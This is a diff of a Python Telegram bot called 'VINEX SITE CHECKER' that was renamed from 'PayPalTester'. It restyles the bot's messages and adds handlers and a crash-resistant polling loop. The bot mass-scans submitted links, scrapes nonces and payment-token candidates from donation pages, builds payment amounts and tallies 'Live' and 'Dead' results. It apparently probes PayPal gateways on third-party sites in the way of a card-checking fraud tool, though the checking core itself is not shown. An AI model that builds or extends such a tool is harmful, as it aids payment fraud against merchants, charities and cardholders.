                             pass
                     else:
-                        log.error(f'Mass gateway delivery failed: {gpath}')
+                        log.error(f'Mass delivery failed: {gpath}')
                 except Exception:
                     log.exception('live delivery')
             else:
@@ -2551,9 +2537,6 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
                 progress['live'] = live
                 progress['dead'] = dead
                 save_progress(uid, progress)
-            # Nonce refresh every N links (log only here; actual refresh in check_single_link)
-            if processed % NONCE_REFRESH_INTERVAL == 0 and processed > 0:
-                log.info(f'Nonce refresh checkpoint at {processed}')
             state['status'] = 'moving'
 
         progress['processed'] = processed
@@ -2562,13 +2545,15 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
         save_progress(uid, progress)
         rate = int((live / total) * 100) if total else 0
         final = (
-            f'📊 <b>✅ COMPLETE (v20.1)</b>\n'
-            f'━━━━━━━━━━━━━━━━━━\n'
-            f'📌 Total: {total}\n'
-            f'✅ Live: {live}\n'
-            f'❌ Dead: {dead}\n'
-            f'💯 Rate: {rate}%\n'
-            f'📁 <code>{results_file}</code>'
+            f'{playful("success")} <b>VINEX MASS COMPLETE!</b>\n'
+            f'╔══════════════════════╗\n'
+            f'║  🎉 SCAN FINISHED  ║\n'
+            f'╚══════════════════════╝\n'
+            f'📌 <b>Total:</b> <code>{total}</code>\n'
+            f'✅ <b>Live:</b> <code>{live}</code>\n'
+            f'❌ <b>Dead:</b> <code>{dead}</code>\n'
+            f'💯 <b>Rate:</b> <code>{rate}%</code>\n'
+            f'📁 <b>Results:</b> <code>{results_file}</code>'
         )
         if status_msg:
             safe_edit_message(chat_id, status_msg.message_id, final)
@@ -2583,80 +2568,128 @@ def run_mass_job(chat_id, uid, links, start_idx, progress):
         save_progress(uid, progress)
         safe_send_message(
             chat_id,
-            f'⚠️ Crashed at {processed}/{total}\n♻️ /resume',
+            f'⚠️ <b>Crashed at {processed}/{total}</b>\n♻️ /resume',
         )
     finally:
         mass_active[uid] = False
 
-# ================================================================
-#  /diag
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🔬 DIAGNOSTICS
+# ═════════════════════════════════════════════════════════════════
 @bot.message_handler(commands=['diag'])
 def cmd_diag(message):
     try:
         if str(message.from_user.id) not in ADMINS:
-            safe_send_message(message.chat.id, '❌ Admin only.')
+            safe_send_message(message.chat.id, '❌ <b>Admin only.</b>')
             return
         parts = message.text.split(maxsplit=1)
         if len(parts) < 2:
-            safe_send_message(message.chat.id, 'Usage: /diag URL')
+            safe_send_message(message.chat.id, 'Usage: <code>/diag URL</code>')
             return
         link = safe_url(parts[1].strip())
         if not link:
             safe_send_message(message.chat.id, '❌ Invalid link.')
             return
-        msg = safe_send_message(message.chat.id, '🔬 Running diagnostics...')
+        msg = safe_send_message(message.chat.id, '🔬 <b>Diagnosing...</b>')
         if not msg:
             return
-        tester = PayPalTester(link)
+        tester = VinexTester(link)
         tester.Key()
         report = (
-            f'🔬 <b>Diagnostics v20.1</b>\n'
+            f'🔬 <b>VINEX DIAGNOSTICS</b>\n'
             f'━━━━━━━━━━━━━━━━━━\n'
             f'🔗 <code>{link[:80]}</code>\n'
-            f'🌐 GW: <code>{tester.gateway_type}</code>\n'
-            f'📄 HTML: <code>{len(tester.page_html)}</code>\n'
-            f'📦 Content: <code>{len(tester.all_content)}</code>\n'
-            f'🆔 Form: <code>{tester.id_form2 or "NONE"}</code>\n'
-            f'📝 Nonce: <code>{tester.nonce or "NONE"}</code>\n'
-            f'🎟️ Candidates: <code>{len(tester.token_candidates)}</code>\n'
-            f'✅ Verified: <code>{tester.token_verified}</code>\n'
-            f'💱 Currency: <code>{tester.currency}</code>\n'
-            f'💰 Min: <code>{tester.minimum}</code>\n'
-            f'📋 Fields: <code>{len(tester.form_fields)}</code>\n'
-            f'🔐 Auth: <code>{tester.auth_method}</code>\n'
-            f'📊 Amounts: <code>{tester._build_amounts()}</code>'
+            f'🌐 <b>GW:</b> <code>{tester.gateway_type}</code>\n'
+            f'📄 <b>HTML:</b> <code>{len(tester.page_html)}b</code>\n'
+            f'📦 <b>Content:</b> <code>{len(tester.all_content)}b</code>\n'
+            f'🆔 <b>Form:</b> <code>{tester.id_form2 or "NONE"}</code>\n'
+            f'📝 <b>Nonce:</b> <code>{tester.nonce or "NONE"}</code>\n'
+            f'🎟️ <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>\n'
+            f'✅ <b>Verified:</b> <code>{tester.token_verified}</code>\n'
+            f'💱 <b>Currency:</b> <code>{tester.currency}</code>\n'
+            f'💰 <b>Min:</b> <code>{tester.minimum}</code>\n'
+            f'📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>\n'
+            f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
+            f'📊 <b>Amounts:</b> <code>{tester._build_amounts()}</code>'
         )
         safe_edit_message(message.chat.id, msg.message_id, report)
     except Exception:
         log.exception('cmd_diag')
 
-# ================================================================
-#  FEEDBACK
-# ================================================================
-@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
-def cb_feedback(call):
+# ═════════════════════════════════════════════════════════════════
+#  🎯 CALLBACKS
+# ═════════════════════════════════════════════════════════════════
+@bot.callback_query_handler(func=lambda c: c.data == 'stats')
+def cb_stats(call):
     try:
-        uid = call.from_user.id
-        kb = types.InlineKeyboardMarkup()
-        kb.add(types.InlineKeyboardButton('↩️ Back', callback_data='start'))
-        try:
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text='✍️ Send your message:',
-                parse_mode='HTML', reply_markup=kb)
-        except Exception:
-            pass
-        waiting_users[uid] = True
+        bot.answer_callback_query(call.id, '📊 Loading stats...')
+        cmd_stats(call.message)
     except Exception:
         pass
 
 
-@bot.callback_query_handler(func=lambda c: c.data == 'stats')
-def cb_stats(call):
+@bot.callback_query_handler(func=lambda c: c.data == 'help')
+def cb_help(call):
     try:
-        cmd_stats(call.message)
+        bot.answer_callback_query(call.id)
+        cmd_help(call.message)
+    except Exception:
+        pass
+
+
+@bot.callback_query_handler(func=lambda c: c.data == 'stop')
+def cb_stop(call):
+    try:
+        bot.answer_callback_query(call.id, '🛑 Stopping...')
+        cmd_stop(call.message)
+    except Exception:
+        pass
+
+
+@bot.callback_query_handler(func=lambda c: c.data == 'howto_paypal')
+def cb_howto(call):
+    try:
+        bot.answer_callback_query(call.id, '💡 Just type it!')
+        safe_send_message(
+            call.message.chat.id,
+            f'🎯 <b>Ready to scan!</b>\n\n'
+            f'Just type:\n'
+            f'<code>/paypal https://example.com/donate</code>\n\n'
+            f'⚡ <i>I\'ll handle the rest.</i>',
+        )
+    except Exception:
+        pass
+
+
+@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
+def cb_back_start(call):
+    try:
+        bot.answer_callback_query(call.id)
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except Exception:
+            pass
+        cmd_start(call.message)
+    except Exception:
+        pass
+
+
+@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
+def cb_feedback(call):
+    try:
+        bot.answer_callback_query(call.id)
+        uid = call.from_user.id
+        kb = types.InlineKeyboardMarkup()
+        kb.add(vinex_btn('Back', 'primary', callback_data='back_start'))
+        try:
+            bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=f'✍️ <b>Send your message:</b>\n<i>The owner will receive it.</i>',
+                parse_mode='HTML', reply_markup=kb)
+        except Exception:
+            pass
+        waiting_users[uid] = True
     except Exception:
         pass
 
@@ -2667,15 +2700,16 @@ def handle_user_msg(message):
         uid = message.from_user.id
         text = message.text or '(non-text)'
         kb = types.InlineKeyboardMarkup()
-        kb.add(types.InlineKeyboardButton('↩️ Reply',
-                                          callback_data=f'reply_{uid}'))
+        kb.add(vinex_btn('Reply', 'success', callback_data=f'reply_{uid}'))
         safe_send_message(
             OWNER_ID,
-            f'📩 <b>Message</b>\n\n👤 {message.from_user.first_name}\n'
-            f'🆔 <code>{uid}</code>\n💬 {text}',
+            f'📩 <b>New Message</b>\n'
+            f'👤 {message.from_user.first_name}\n'
+            f'🆔 <code>{uid}</code>\n'
+            f'💬 {text}',
             reply_markup=kb,
         )
-        safe_send_message(uid, '✅ Sent.')
+        safe_send_message(uid, '✅ <b>Sent!</b>')
         waiting_users.pop(uid, None)
     except Exception:
         pass
@@ -2686,7 +2720,7 @@ def cb_reply(call):
     try:
         target = int(call.data.split('_', 1)[1])
         reply_mode[call.from_user.id] = target
-        safe_send_message(call.from_user.id, '✍️ Reply:')
+        safe_send_message(call.from_user.id, '✍️ <b>Reply:</b>')
     except Exception:
         pass
 
@@ -2703,9 +2737,9 @@ def handle_admin_reply(message):
     except Exception:
         pass
 
-# ================================================================
-#  ADMIN
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  👑 ADMIN
+# ═════════════════════════════════════════════════════════════════
 @bot.message_handler(commands=['block2'])
 def admin_block(message):
     try:
@@ -2720,7 +2754,7 @@ def admin_block(message):
             return
         with open(BLOCK_FILE, 'a') as f:
             f.write(f'{uid}\n')
-        safe_send_message(message.chat.id, f'✅ Blocked {uid}.')
+        safe_send_message(message.chat.id, f'✅ Blocked <code>{uid}</code>')
     except Exception:
         pass
 
@@ -2739,24 +2773,7 @@ def admin_unblock(message):
             for l in lines:
                 if l.strip() != uid:
                     f.write(l)
-        safe_send_message(message.chat.id, f'✅ Unblocked {uid}.')
-    except Exception:
-        pass
-
-
-@bot.message_handler(commands=['blocklist'])
-def admin_blocklist(message):
-    try:
-        if str(message.from_user.id) not in ADMINS:
-            return
-        blocked = [l.strip() for l in open(BLOCK_FILE).read().splitlines() if l.strip()]
-        if not blocked:
-            safe_send_message(message.chat.id, '📋 Empty.')
-            return
-        text = '📋 <b>Blocked:</b>\n'
-        for i, u in enumerate(blocked, 1):
-            text += f'{i}. <code>{u}</code>\n'
-        safe_send_message(message.chat.id, text)
+        safe_send_message(message.chat.id, f'✅ Unblocked <code>{uid}</code>')
     except Exception:
         pass
 
@@ -2782,20 +2799,55 @@ def admin_broadcast(message):
                 time.sleep(0.05)
             except Exception:
                 failed += 1
-        safe_send_message(message.chat.id, f'📢 Done.\n✅ {sent}\n❌ {failed}')
+        safe_send_message(
+            message.chat.id,
+            f'📢 <b>Broadcast done.</b>\n✅ {sent} | ❌ {failed}',
+        )
     except Exception:
         pass
 
-# ================================================================
-#  MAIN
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🚀 MAIN — Resilient polling
+# ═════════════════════════════════════════════════════════════════
 if __name__ == '__main__':
-    log.info('Bot v20.1 FINAL starting...')
+    log.info('VINEX v21 starting...')
+    print(r'''
+    __  ___  _  __ ______ _  __
+   / / / _ \/ |/ // __/ / |/ /
+  / /_/ // /    // _/ /    /
+ /___/_//_/_/|_/___/_/_/|_/
+    SITE CHECKER v21
+    ''')
     try:
         cleanup_old_files()
     except Exception:
         pass
-    try:
-        bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
-    except Exception as e:
-        log.exception('polling crashed: %s', e)
+
+    while True:
+        try:
+            log.info('Polling loop starting...')
+            bot.infinity_polling(
+                timeout=60,
+                long_polling_timeout=60,
+                skip_pending=True,
+                logger_level=logging.WARNING,
+            )
+        except KeyboardInterrupt:
+            log.info('Manual shutdown.')
+            break
+        except Exception as e:
+            err = str(e).lower()
+            log.error(f'Polling crash: {str(e)[:200]}')
+            if '429' in err or 'too many' in err:
+                try:
+                    wait = int(err.split('retry after ')[1].split()[0])
+                except Exception:
+                    wait = 30
+                log.info(f'Rate limited. Sleeping {wait}s...')
+                time.sleep(wait)
+            elif '502' in err or 'bad gateway' in err:
+                log.info('Bad gateway. Sleeping 20s...')
+                time.sleep(20)
+            else:
+                log.info('Retrying in 15s...')
+                time.sleep(15)
